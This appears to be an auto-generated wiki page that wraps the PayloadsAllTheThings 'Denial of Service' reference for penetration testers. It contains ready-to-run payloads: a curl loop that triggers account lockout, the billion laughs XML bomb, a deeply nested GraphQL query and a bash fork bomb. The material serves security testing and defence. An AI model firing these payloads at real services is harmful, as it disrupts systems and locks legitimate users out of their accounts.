---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Denial of Service

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-denial-of-service-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Denial of Service/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Denial of Service](../../topics/denial-of-service/denial-of-service.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-denial-of-service-readme |
| name | Denial of Service |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Denial%20of%20Service/README.md |

## Preserved Source Material

````yaml
_body: "# Denial of Service\n\n> A Denial of Service (DoS) attack aims to make a service unavailable by overwhelming it with\
  \ a flood of illegitimate requests or exploiting vulnerabilities in the target's software to crash or degrade performance.\
  \ In a Distributed Denial of Service (DDoS), attackers use multiple sources (often compromised machines) to perform the\
  \ attack simultaneously.\n\n## Summary\n\n* [Methodology](#methodology)\n    * [Locking Customer Accounts](#locking-customer-accounts)\n\
  \    * [File Limits on FileSystem](#file-limits-on-filesystem)\n    * [Memory Exhaustion - Technology Related](#memory-exhaustion---technology-related)\n\
  * [References](#references)\n\n## Methodology\n\nHere are some examples of Denial of Service (DoS) attacks. These examples\
  \ should serve as a reference for understanding the concept, but any DoS testing should be conducted cautiously, as it can\
  \ disrupt the target environment and potentially result in loss of access or exposure of sensitive data.\n\n### Locking\
  \ Customer Accounts\n\nExample of Denial of Service that can occur when testing customer accounts.\nBe very careful as this\
  \ is most likely **out-of-scope** and can have a high impact on the business.\n\n* Multiple attempts on the login page when\
  \ the account is temporary/indefinitely banned after X bad attempts.\n\n    ```ps1\n    for i in {1..100}; do curl -X POST\
  \ -d \"username=user&password=wrong\" <target_login_url>; done\n    ```\n\n### File Limits on FileSystem\n\nWhen a process\
  \ is writing a file on the server, try to reach the maximum number of files allowed by the filesystem format. The system\
  \ should output a message: `No space left on device` when the limit is reached.\n\n| Filesystem | Maximum Inodes |\n| ---\
  \        | --- |\n| BTRFS      | 2^64 (~18 quintillion) |\n| EXT4       | ~4 billion |\n| FAT32      | ~268 million files\
  \ |\n| NTFS       | ~4.2 billion (MFT entries) |\n| XFS        | Dynamic (disk size) |\n| ZFS        | ~281 trillion |\n\
  \nAn alternative of this technique would be to fill a file used by the application until it reaches the maximum size allowed\
  \ by the filesystem, for example it can occur on a SQLite database or a log file.\n\nFAT32 has a significant limitation\
  \ of **4 GB**, which is why it's often replaced with exFAT or NTFS for larger files.\n\nModern filesystems like BTRFS, ZFS,\
  \ and XFS support exabyte-scale files, well beyond current storage capacities, making them future-proof for large datasets.\n\
  \n### Memory Exhaustion - Technology Related\n\nDepending on the technology used by the website, an attacker may have the\
  \ ability to trigger specific functions or paradigm that will consume a huge chunk of memory.\n\n* **XML External Entity**:\
  \ Billion laughs attack/XML bomb\n\n    ```xml\n    <?xml version=\"1.0\"?>\n    <!DOCTYPE lolz [\n    <!ENTITY lol \"lol\"\
  >\n    <!ELEMENT lolz (#PCDATA)>\n    <!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n    <!ENTITY\
  \ lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\n    <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\"\
  >\n    <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n    <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\"\
  >\n    <!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">\n    <!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\"\
  >\n    <!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">\n    <!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\"\
  >\n    ]>\n    <lolz>&lol9;</lolz>\n    ```\n\n* **GraphQL**: Deeply-nested GraphQL queries.\n\n    ```ps1\n    query {\
  \ \n        repository(owner:\"rails\", name:\"rails\") {\n            assignableUsers (first: 100) {\n                nodes\
  \ {\n                    repositories (first: 100) {\n                        nodes {\n                            \n  \
  \                      }\n                    }\n                }\n            }\n        }\n    }\n    ```\n\n* **Image\
  \ Resizing**: try to send invalid pictures with modified headers, e.g: abnormal size, big number of pixels.\n* **SVG handling**:\
  \ SVG file format is based on XML, try the billion laughs attack.\n* **Regular Expression**: ReDoS\n* **Fork Bomb**: rapidly\
  \ creates new processes in a loop, consuming system resources until the machine becomes unresponsive.\n\n    ```ps1\n  \
  \  :(){ :|:& };:\n    ```\n\n## References\n\n* [DEF CON 32 - Practical Exploitation of DoS in Bug Bounty - Roni Lupin Carta\
  \ - October 16, 2024](https://web.archive.org/web/20241115121102/https://youtu.be/b7WlUofPJpU)\n* [Denial of Service Cheat\
  \ Sheet - OWASP Cheat Sheet Series - July 16, 2019](https://web.archive.org/web/20260303124303/https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html)"
_relative_path: Denial of Service/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Denial of Service/README.md
````
